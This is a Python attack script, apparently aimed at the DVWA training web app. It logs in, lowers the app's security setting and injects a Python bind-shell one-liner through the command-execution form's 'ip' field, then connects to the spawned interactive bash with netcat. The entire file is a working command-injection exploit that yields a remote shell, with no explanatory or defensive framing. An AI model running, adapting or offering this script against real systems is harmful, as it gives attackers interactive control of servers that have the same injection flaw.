#! /usr/bin/env python3

import requests,re,os,threading

baseurl = input("Base url: ")
port = int(input("Backdoor port: "))
username = input("User name: ")
password = input("Password: ")

if baseurl[-1]=='/':
    baseurl = baseurl[:-1]

ip = re.search("(\\d+.\\d+.\\d+.\\d+)",baseurl).group(1)

print("Logging server...")
req = requests.get("%s/login.php"%baseurl,headers={"User-Agent":"Mozilla"})
cookies = dict(req.cookies.items())
user_token = re.search("<input type=\'hidden\' name=\'user_token\' value=\'(.*?)\' />",req.text,re.S).group(1)
print("User_token: %s"%(user_token,))
print("Cookies: ",cookies)
req = requests.post("%s/login.php"%(baseurl,),data={
        "username":username,
        "password":password,
        "Login":"Login",
        "user_token":user_token
    },cookies=cookies)

print("Setting the security...")
cookies["security"]="low"

print("Getting shell...")
def start_backdoor(args):
    req = requests.post("%s/vulnerabilities/exec/"%(baseurl,),data = {
            "ip":"| python -c \"import socket,subprocess,os;s=socket.socket();s.bind(('0.0.0.0',%d));s.listen(%d);c=s.accept()[0];os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(['/bin/bash','-i'])\" &> /dev/stdout"%(port,port),
            "Submit":"Submit",
            "user_token":user_token
        },cookies = cookies)
    args[0] = -1
    print(req.text)
status = [0]
thread = threading.Thread(target=start_backdoor,args=(status,))
thread.start()

print("Returnning nc...")
while os.system("nc %s %d"%(ip,port)):
    if status[0]:
        print("Get shell failed")
        break

print("Waiting for the backdoor close...")
thread.join()